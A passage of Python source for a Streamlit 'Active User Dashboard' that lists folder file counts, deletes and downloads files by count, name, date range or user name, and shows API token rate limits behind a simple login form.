                # Alternate between columns for better layout
                if i % 3 == 0:
                    with col1:
                        st.markdown(
                            f"""
                            <div style="padding: 10px; border-radius: 10px; background-color: #212121; margin: 10px 0;">
                                <a href="{github_url}" style="text-decoration: none; color: inherit;">
                                    <h3>{folder_name.capitalize()}</h3>
                                    <p style="font-size: 24px; font-weight: bold; color: #4a90e2;">{num_files} files</p>
                                </a>
                            </div>
                            """,
                            unsafe_allow_html=True
                        )
                elif i % 3 == 1:
                    with col2:
                        st.markdown(
                            f"""
                            <div style="padding: 10px; border-radius: 10px; background-color: #212121; margin: 10px 0;">
                                <a href="{github_url}" style="text-decoration: none; color: inherit;">
                                    <h3>{folder_name.capitalize()}</h3>
                                    <p style="font-size: 24px; font-weight: bold; color: #4a90e2;">{num_files} files</p>
                                </a>
                            </div>
                            """,
                            unsafe_allow_html=True
                        )
                else:
                    with col3:
                        st.markdown(
                            f"""
                            <div style="padding: 10px; border-radius: 10px; background-color: #212121; margin: 10px 0;">
                                <a href="{github_url}" style="text-decoration: none; color: inherit;">
                                    <h3>{folder_name.capitalize()}</h3>
                                    <p style="font-size: 24px; font-weight: bold; color: #4a90e2;">{num_files} files</p>
                                </a>
                            </div>
                            """,
                            unsafe_allow_html=True
                        )

    # Tab 3: Delete Files
    with tab3:
        # Create tabs
        tab31, tab32 = st.tabs(["Delete Files", "Advanced Delete"])
        with tab31:
            st.header("Delete Files")
            st.write("Select folders and the number of files to delete.")

            # Track deletion progress
            if "deletion_progress" not in st.session_state:
                st.session_state.deletion_progress = {folder: {"total": 0, "deleted": 0} for folder in FOLDERS.keys()}

            # Initialize deletion logs in session state
            if "deletion_logs" not in st.session_state:
                st.session_state.deletion_logs = "Deletion Log:\n"

            # Display folder selection and sliders
            selected_folders = {}
            for folder_name, folder_path in FOLDERS.items():
                files = get_number_of_files(folder_path)
                num_files = len(files)

                # Card-like layout for each folder
                with st.container():
                    st.subheader(f"Folder: {folder_name}")
                    col1, col2 = st.columns([1, 3])
                    with col1:
                        enable_deletion = st.checkbox(f"Enable deletion for {folder_name}", key=f"enable_{folder_name}")
                    with col2:
                        if enable_deletion:
                            num_files_to_delete = st.slider(
                                f"Number of files to delete from {folder_name}",
                                min_value=0,
                                max_value=num_files,
                                key=f"slider_{folder_name}"
                            )
                            selected_folders[folder_name] = num_files_to_delete

            # Single delete button
            if st.button("Delete Selected Files"):
                if selected_folders:
                    # Create a terminal-like output box
                    terminal_placeholder = st.empty()
                    terminal_placeholder.markdown(
                        f"""
                        <div style="background-color: black; color: white; padding: 10px; border-radius: 5px; font-family: monospace; height: 200px; overflow-y: scroll;">
                            <pre>{st.session_state.deletion_logs}</pre>
                        </div>
                        """,
                        unsafe_allow_html=True
                    )

                    # Simulate deletion for selected folders
                    for folder_name, num_files_to_delete in selected_folders.items():
                        if num_files_to_delete > 0:
                            st.session_state.deletion_progress[folder_name]["total"] = num_files_to_delete
                            st.session_state.deletion_progress[folder_name]["deleted"] = 0

                            # Delete files
                            delete_files(folder_name, num_files_to_delete, terminal_placeholder)
                            st.session_state.deletion_progress[folder_name]["deleted"] = num_files_to_delete

                    st.success("Deletion completed!")
                else:
                    st.warning("No folders selected for deletion.")
            
        
        # Tab 32: Advanced Delete
        with tab32:
            st.header("Advanced Delete")
            st.write("Choose an action and configure the options below.")

            # Advanced options
            stop_deletion = st.checkbox("Stop Deletion when a Specific File is Found")
            delete_specific = st.checkbox("Delete when a Specific File is Found")
            delete_by_date = st.checkbox("Delete Files within Date and Time Range")

            # Folder-specific options
            folder_options = {}
            for folder_name, folder_path in FOLDERS.items():
                with st.expander(f"Folder: {folder_path}"):
                    folder_options[folder_name] = {
                        "stop_file": st.text_input(f"Stop File Name for {folder_name}", key=f"stop_{folder_name}"),
                        "delete_file_only": st.text_input(f"Delete File Name for {folder_name}", key=f"delete_{folder_name}"),
                    }

                    if delete_by_date:
                        # Start Date and Start Time in the same row
                        col1, col2 = st.columns(2)
                        with col1:
                            start_date = st.text_input(f"Start Date (YYYYMMDD) for {folder_name}", key=f"start_date_{folder_name}")
                        with col2:
                            start_time = st.text_input(f"Start Time (HHMMSS) for {folder_name}", key=f"start_time_{folder_name}")

                        # End Date and End Time in the same row
                        col3, col4 = st.columns(2)
                        with col3:
                            end_date = st.text_input(f"End Date (YYYYMMDD) for {folder_name}", key=f"end_date_{folder_name}")
                        with col4:
                            end_time = st.text_input(f"End Time (HHMMSS) for {folder_name}", key=f"end_time_{folder_name}")

                        # Store date and time range in folder options
                        folder_options[folder_name]["start_date"] = start_date
                        folder_options[folder_name]["start_time"] = start_time
                        folder_options[folder_name]["end_date"] = end_date
                        folder_options[folder_name]["end_time"] = end_time

            # Delete button for advanced options
            if st.button("Delete Files with Advanced Options"):
                if stop_deletion or delete_specific or delete_by_date:
                    # Create a terminal-like output box
                    terminal_placeholder = st.empty()
                    terminal_placeholder.markdown(
                        f"""
                        <div style="background-color: black; color: white; padding: 10px; border-radius: 5px; font-family: monospace; height: 200px; overflow-y: scroll;">
                            <pre>{st.session_state.deletion_logs}</pre>
                        </div>
                        """,
                        unsafe_allow_html=True
                    )

                    # Perform deletion for each folder
                    for folder_name, folder_path in FOLDERS.items():
                        # Get folder-specific options
                        stop_file = folder_options[folder_name]["stop_file"] if stop_deletion else None
                        delete_file_only = folder_options[folder_name]["delete_file_only"] if delete_specific else None

                        # Parse date and time range for the folder
                        if delete_by_date:
                            start_date_str = folder_options[folder_name]["start_date"]
                            start_time_str = folder_options[folder_name]["start_time"]
                            end_date_str = folder_options[folder_name]["end_date"]
                            end_time_str = folder_options[folder_name]["end_time"]

                            # Skip deletion if any of the date/time fields are empty
                            if not start_date_str or not start_time_str or not end_date_str or not end_time_str:
                                st.warning(f"Skipping deletion for {folder_name} because date/time fields are incomplete.")
                                continue
                            
                            try:
                                start_date = datetime.strptime(f"{start_date_str} {start_time_str}", "%Y%m%d %H%M%S")
                                end_date = datetime.strptime(f"{end_date_str} {end_time_str}", "%Y%m%d %H%M%S")
                            except ValueError:
                                st.error(f"Invalid date or time format for {folder_name}. Please use YYYYMMDD for dates and HHMMSS for times.")
                                continue
                        else:
                            start_date = end_date = None

                        # Skip deletion if no advanced options are selected for this folder
                        if not stop_file and not delete_file_only and not delete_by_date:
                            continue
                        
                        # Delete files with advanced options
                        delete_files_advanced(folder_path, terminal_placeholder, stop_file, delete_file_only, start_date, end_date)

                    st.success("Advanced deletion completed!")
                else:
                    st.warning("No advanced options selected.")



    with tab4:
        st.header("Token Details")
        
        # Add a refresh button
        if st.button("Refresh Token Data"):
            get_tokensDetails()  # Rerun the app to fetch fresh data
            
        
        
        
        # Process and display rate limit details for each token
        for token_name, token in tokens_data.items():
            st.subheader(f"Token: {token_name.capitalize()}")
            
            # Process the token
            processed_token = process_token(token)
            
            # Get rate limit details
            rate_limit_details = get_rate_limit_details(processed_token)
            
            # Display the rate limit information in a card format
            col1, col2, col3 = st.columns(3)
        
            # Card 1: Rate Limit
            with col1:
                st.metric(label="Rate Limit", value=rate_limit_details["limit"])
        
            # Card 2: Remaining Requests
            with col2:
                st.metric(label="Remaining Requests", value=rate_limit_details["remaining"])
        
            # Card 3: Reset Time
            with col3:
                st.metric(label="Reset Time", value=rate_limit_details["reset_time"])
        
            # Optional: Add a progress bar to visualize remaining requests
            if rate_limit_details["limit"] and rate_limit_details["remaining"]:
                progress = (int(rate_limit_details["remaining"]) / int(rate_limit_details["limit"])) * 100
                st.progress(int(progress))
                st.caption(f"{rate_limit_details['remaining']} / {rate_limit_details['limit']} requests remaining.")
        
            # Add a divider between tokens
            st.divider()
            
        # Add a slider to set the refresh interval
        refresh_interval = st.slider("Refresh interval (seconds)", min_value=10, max_value=600, value=60)
        # Automatically refresh the app
        time.sleep(refresh_interval)
        # st.experimental_rerun()
        get_tokensDetails()  # Rerun the app to fetch fresh data
    
    
    
    # Tab 5: Download Files
    with tab5:
        st.header("Download Files")
        st.write("Choose an action and configure the options below.")

        # Advanced options for downloading files
        download_by_date = st.checkbox("Download Files within Date and Time Range")
        download_by_num_files = st.checkbox("Download a Specific Number of Files")
        download_by_user_name = st.checkbox("Download Files by Unique User Name")

        # Folder-specific options for downloading files
        download_folder_options = {}
        for folder_name, folder_path in FOLDERS.items():
            with st.expander(f"Folder: {folder_path}"):
                # Start Date and Start Time in the same row
                col1, col2 = st.columns(2)
                with col1:
                    start_date = st.text_input(f"Start Date (YYYYMMDD) for {folder_name}", key=f"download_start_date_{folder_name}")
                with col2:
                    start_time = st.text_input(f"Start Time (HHMMSS) for {folder_name}", key=f"download_start_time_{folder_name}")

                # End Date and End Time in the same row
                col3, col4 = st.columns(2)
                with col3:
                    end_date = st.text_input(f"End Date (YYYYMMDD) for {folder_name}", key=f"download_end_date_{folder_name}")
                with col4:
                    end_time = st.text_input(f"End Time (HHMMSS) for {folder_name}", key=f"download_end_time_{folder_name}")

                # Number of Files and Unique User Name
                if download_by_num_files:
                    num_files = st.number_input(f"Number of Files to Download for {folder_name}", min_value=1, key=f"download_num_files_{folder_name}")
                else:
                    num_files = None

                if download_by_user_name:
                    unique_user_name = st.text_input(f"Unique User Name for {folder_name}", key=f"download_unique_user_name_{folder_name}")
                else:
                    unique_user_name = None

                # Store options in folder-specific dictionary
                download_folder_options[folder_name] = {
                    "start_date": start_date,
                    "start_time": start_time,
                    "end_date": end_date,
                    "end_time": end_time,
                    "num_files": num_files,
                    "unique_user_name": unique_user_name
                }

        # Download button for advanced options
        if st.button("Download Files with Advanced Options"):
            if download_by_date or download_by_num_files or download_by_user_name:
                # Create a terminal-like output box
                terminal_placeholder = st.empty()
                terminal_placeholder.markdown(
                    f"""
                    <div style="background-color: black; color: white; padding: 10px; border-radius: 5px; font-family: monospace; height: 200px; overflow-y: scroll;">
                        <pre>Download Log:</pre>
                    </div>
                    """,
                    unsafe_allow_html=True
                )

                # Initialize or update the session state for download logs
                if "download_logs" not in st.session_state:
                    st.session_state.download_logs = "Download Log:\n"

                # Perform download for each folder
                for folder_name, folder_path in FOLDERS.items():
                    # Get folder-specific options
                    start_date_str = download_folder_options[folder_name]["start_date"]
                    start_time_str = download_folder_options[folder_name]["start_time"]
                    end_date_str = download_folder_options[folder_name]["end_date"]
                    end_time_str = download_folder_options[folder_name]["end_time"]
                    num_files = download_folder_options[folder_name]["num_files"]
                    unique_user_name = download_folder_options[folder_name]["unique_user_name"]

                    # Parse date and time range for the folder
                    if download_by_date:
                        if not start_date_str or not start_time_str or not end_date_str or not end_time_str:
                            st.warning(f"Skipping download for {folder_name} because date/time fields are incomplete.")
                            continue

                        try:
                            start_date = datetime.strptime(f"{start_date_str} {start_time_str}", "%Y%m%d %H%M%S")
                            end_date = datetime.strptime(f"{end_date_str} {end_time_str}", "%Y%m%d %H%M%S")
                        except ValueError:
                            st.error(f"Invalid date or time format for {folder_name}. Please use YYYYMMDD for dates and HHMMSS for times.")
                            continue
                    else:
                        start_date = end_date = None

                    # Skip download if no advanced options are selected for this folder
                    if not download_by_date and not download_by_num_files and not download_by_user_name:
                        continue

                    # Download files with advanced options
                    download_files_advanced(folder_path, terminal_placeholder, start_date, end_date, num_files, unique_user_name)

                st.success("Download completed!")
            else:
                st.warning("No advanced options selected.")

   
    
    
# Streamlit app
st.set_page_config(page_title="Active User Dashboard", layout="wide", page_icon=":computer:")



# Login Functionality
def login():
    st.title("Login to the Dashboard")
    st.write("Please enter your credentials to access the dashboard.")

    # Login form
    with st.form("login_form"):
        username = st.text_input("Username")
        password = st.text_input("Password", type="password")
        submitted = st.form_submit_button("Login")

        if submitted:
            if authenticate_user(username, password):
                st.session_state["authenticated"] = True
                st.success("Login successful! Redirecting...")
            else:
                st.error("Invalid username or password.")

# Main app logic
if "authenticated" not in st.session_state:
    st.session_state["authenticated"] = False

if not st.session_state["authenticated"]:
    login()
else:
    tabbeddashboard()


# Custom footer
import datetime
current_year = datetime.datetime.now().year
st.markdown(f"""
    <hr>
    <footer style='text-align: center;'>
        © {current_year} Active User Dashboard | Developed by <a href='https://bibekchandsah.com.np' target='_blank' style='text-decoration: none; color: inherit;'>Bibek Chand Sah</a>
    </footer>
""", unsafe_allow_html=True)




